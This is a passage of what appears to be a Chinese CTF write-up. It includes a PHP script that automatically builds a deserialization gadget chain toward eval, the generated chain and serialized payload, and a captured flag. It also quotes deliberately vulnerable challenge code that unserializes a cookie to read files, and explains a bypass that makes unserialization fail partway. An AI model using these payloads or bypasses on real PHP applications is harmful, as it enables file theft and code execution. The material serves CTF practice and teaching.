class="subst">&#123;$functionName&#125;</span>=\&quot;None\&quot;;&#125;&#125;&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Find a class with specified function in it</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name to find</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed class that contains the function or false if no class contains</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindClassByFunction</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="variable">$functions</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$function</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$function</span>, <span class="keyword">array</span>(<span class="variable">$functionName</span>)))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$class</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Backtrace to find the path to eval</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $functionName string function name which is start of backtrack</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool false if none path found yet || none if path found which would have written to exp.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BackTrace</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$functionName</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$CLASS_FILE</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$classes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">        <span class="variable">$functions</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">        <span class="variable">$variables</span> = get_class_vars(<span class="variable">$class</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$functions</span> <span class="keyword">as</span> <span class="variable">$function</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$function</span>, <span class="keyword">array</span>(<span class="variable">$functionName</span>)))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$jmpFunction</span> = array_keys(<span class="variable">$variables</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="variable">$rule_0</span> = <span class="string">&quot;/public function <span class="subst">$functionName</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                preg_match_all(<span class="variable">$rule_0</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="variable">$rule_1</span> = <span class="string">&#x27;/\$this-&gt;&#x27;</span> . <span class="variable">$jmpFunction</span> . <span class="string">&#x27;-&gt;([a-zA-Z0-9]&#123;6&#125;)\(/&#x27;</span>;</span><br><span class="line">                preg_match_all(<span class="variable">$rule_1</span>, <span class="variable">$content</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$matches</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(count(<span class="variable">$matches</span>[<span class="number">1</span>]) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable">$next_method_list</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span>(<span class="variable">$next_method_list</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">                        <span class="variable">$extractFunctionContents</span> = <span class="string">&quot;/public function <span class="subst">$v</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                        preg_match_all(<span class="variable">$extractFunctionContents</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$functionContent</span>);</span><br><span class="line">                        <span class="variable">$params</span> = <span class="string">&quot;\\&quot;</span> . <span class="variable">$functionContent</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$extractRightOp</span> = <span class="string">&quot;/<span class="subst">$params</span>=(.*?);/&quot;</span>;</span><br><span class="line">                        preg_match_all(<span class="variable">$extractRightOp</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$rightOp</span>);</span><br><span class="line">                        <span class="keyword">if</span>(count(<span class="variable">$rightOp</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// if none right operator when eval is valid</span></span><br><span class="line">                        <span class="variable">$isDestination</span> = preg_match(<span class="string">&quot;/eval\((.*?)\);/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]) &amp;&amp; !preg_match(<span class="string">&quot;/=&#x27;/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">                        <span class="variable">$step</span> = FindClassByFunction(<span class="variable">$v</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$isDestination</span>)&#123;</span><br><span class="line">                            array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line">                            file_put_contents(<span class="string">&quot;exp.php&quot;</span>, <span class="string">&quot;&lt;?php&quot;</span> . PHP_EOL . implode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$result</span>) . PHP_EOL . <span class="string">&quot;echo serialize(new PADDING());&quot;</span>);</span><br><span class="line">                            <span class="keyword">die</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$step</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                            array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span>(!BackTrace(<span class="variable">$v</span>))&#123;</span><br><span class="line">                                array_pop(<span class="variable">$result</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">elseif</span>(count(<span class="variable">$matches</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable">$destinationFunction</span> = <span class="variable">$matches</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$extractFunctionContents</span> = <span class="string">&quot;/public function <span class="subst">$destinationFunction</span>\((.*?)\)(.*?)    &#125;/ms&quot;</span>;</span><br><span class="line">                    preg_match_all(<span class="variable">$extractFunctionContents</span>, <span class="variable">$CLASS_FILE</span>, <span class="variable">$functionContent</span>);</span><br><span class="line">                    <span class="variable">$params</span> = <span class="string">&quot;\\&quot;</span> . <span class="variable">$functionContent</span>[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$extractRightOp</span> = <span class="string">&quot;/<span class="subst">$params</span>=(.*?);/&quot;</span>;</span><br><span class="line">                    preg_match_all(<span class="variable">$extractRightOp</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>], <span class="variable">$rightOp</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// eval arg has been padded, invalid.</span></span><br><span class="line">                    <span class="keyword">if</span>(count(<span class="variable">$rightOp</span>[<span class="number">1</span>]) == <span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$isDestination</span> = preg_match(<span class="string">&quot;/eval\((.*?)\);/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">                        &amp;&amp; !preg_match(<span class="string">&quot;/=&#x27;/&quot;</span>, <span class="variable">$functionContent</span>[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$isDestination</span>)&#123;</span><br><span class="line">                        array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                        file_put_contents(<span class="string">&quot;exp.php&quot;</span>, <span class="string">&quot;&lt;?php&quot;</span> . PHP_EOL . implode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$result</span>) . PHP_EOL . <span class="string">&quot;echo serialize(new PADDING());&quot;</span>);</span><br><span class="line">                        <span class="keyword">die</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$step</span> = FindClassByFunction(<span class="variable">$destinationFunction</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$step</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                        array_push(<span class="variable">$result</span>, GenerateClass(<span class="variable">$class</span>, <span class="variable">$jmpFunction</span>, <span class="variable">$step</span>));</span><br><span class="line">                        <span class="keyword">if</span>(!BackTrace(<span class="variable">$destinationFunction</span>))&#123;</span><br><span class="line">                            array_pop(<span class="variable">$result</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BackTrace(<span class="string">&quot;yuAp2O&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>生成的代码整理后如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vPFL76</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;NwyYaGg=<span class="keyword">new</span> KUGigF();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUGigF</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;yeibvDG=<span class="keyword">new</span> rMo15X();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rMo15X</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;FK5IgDD=<span class="keyword">new</span> cGInXd();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cGInXd</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;pazgAVc=<span class="keyword">new</span> Akn5g6();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Akn5g6</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;HRHFKR3=<span class="keyword">new</span> ox6mgh();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ox6mgh</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;yHSRG7p=<span class="keyword">new</span> UvIezc();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UvIezc</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;G6ci7az=<span class="keyword">new</span> a68xiw();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a68xiw</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;ndGFMQ7=<span class="keyword">new</span> xSroRa();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xSroRa</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;oXHWucx=<span class="keyword">new</span> aCWT05();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aCWT05</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;HGtml2m=<span class="keyword">new</span> yDIcsa();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yDIcsa</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;EQLf6vK=<span class="keyword">new</span> pkszNY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkszNY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;NU3qxgm=<span class="keyword">new</span> tHRECm();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tHRECm</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;niY1imT=<span class="keyword">new</span> xwg8HP();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xwg8HP</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;UPxY7Rh=<span class="keyword">new</span> uwsYxI();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">uwsYxI</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;O6oCtiA=<span class="keyword">new</span> MxQ8vY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MxQ8vY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;z4n5cgd=<span class="keyword">new</span> v9zyqI();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">v9zyqI</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;lXmIYTK=<span class="keyword">new</span> ZQTdEz();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZQTdEz</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;tfRml9G=<span class="keyword">new</span> sXLGZq();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sXLGZq</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;pwGsvpx=<span class="keyword">new</span> gdK3FL();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gdK3FL</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;XPiW7lc=<span class="keyword">new</span> Wu1LLY();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wu1LLY</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="keyword">$this</span>-&gt;SqZ7tgA=<span class="keyword">new</span> e5RFzb();&#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e5RFzb</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> vPFL76());</span><br></pre></td></tr></table></figure>

<p>将序列化字符串生成得到如下内容。</p>
<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;vPFL76&quot;:1:&#123;s:7:&quot;NwyYaGg&quot;;O:6:&quot;KUGigF&quot;:1:&#123;s:7:&quot;yeibvDG&quot;;O:6:&quot;rMo15X&quot;:1:&#123;s:7:&quot;FK5IgDD&quot;;O:6:&quot;cGInXd&quot;:1:&#123;s:7:&quot;pazgAVc&quot;;O:6:&quot;Akn5g6&quot;:1:&#123;s:7:&quot;HRHFKR3&quot;;O:6:&quot;ox6mgh&quot;:1:&#123;s:7:&quot;yHSRG7p&quot;;O:6:&quot;UvIezc&quot;:1:&#123;s:7:&quot;G6ci7az&quot;;O:6:&quot;a68xiw&quot;:1:&#123;s:7:&quot;ndGFMQ7&quot;;O:6:&quot;xSroRa&quot;:1:&#123;s:7:&quot;oXHWucx&quot;;O:6:&quot;aCWT05&quot;:1:&#123;s:7:&quot;HGtml2m&quot;;O:6:&quot;yDIcsa&quot;:1:&#123;s:7:&quot;EQLf6vK&quot;;O:6:&quot;pkszNY&quot;:1:&#123;s:7:&quot;NU3qxgm&quot;;O:6:&quot;tHRECm&quot;:1:&#123;s:7:&quot;niY1imT&quot;;O:6:&quot;xwg8HP&quot;:1:&#123;s:7:&quot;UPxY7Rh&quot;;O:6:&quot;uwsYxI&quot;:1:&#123;s:7:&quot;O6oCtiA&quot;;O:6:&quot;MxQ8vY&quot;:1:&#123;s:7:&quot;z4n5cgd&quot;;O:6:&quot;v9zyqI&quot;:1:&#123;s:7:&quot;lXmIYTK&quot;;O:6:&quot;ZQTdEz&quot;:1:&#123;s:7:&quot;tfRml9G&quot;;O:6:&quot;sXLGZq&quot;:1:&#123;s:7:&quot;pwGsvpx&quot;;O:6:&quot;gdK3FL&quot;:1:&#123;s:7:&quot;XPiW7lc&quot;;O:6:&quot;Wu1LLY&quot;:1:&#123;s:7:&quot;SqZ7tgA&quot;;O:6:&quot;e5RFzb&quot;:0:&#123;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发送含有载荷的请求即可获得 flag。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623642251074/d19177d6d106405812c88903810415d786cbdda5.png" alt="image-20210614114407478"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85e385d3-46be-4e29-b005-3e54f85d2370&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WhereIsUWebShell"><a href="#WhereIsUWebShell" class="headerlink" title="WhereIsUWebShell"></a>WhereIsUWebShell</h3><p>题目给出了如下源代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]))&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;ctfer&quot;</span>,serialize(<span class="string">&quot;ctfer&quot;</span>),time()+<span class="number">3600</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I see your Cookie&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/myclass/i&#x27;</span>,serialize(<span class="variable">$res</span>)))&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error: Class &#x27;myclass&#x27; not found &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;myclass.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;qwb) <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;qwb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&quot;/var/www/html/<span class="subst">$classname</span>.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很容易看出反序列化读文件，关键在于后面 <code>myclass</code> 的正则过滤。此时只有让 <code>$res</code> 不存在，再次序列化的字符串里才能没有这个类。在 PHP 的手册中有如下描述。</p>
<blockquote>
<p>如果传递的字符串不可反序列化，则返回 **<code>false</code>**，并产生一个 **<code>E_NOTICE</code>**。</p>
</blockquote>
<p>因此，我们只需要让反序列化进行到一半就失败即可。尝试修改序列化字符串的最后几个字符即可达成目的。使用如下脚本构造读取文件的载荷。</p>
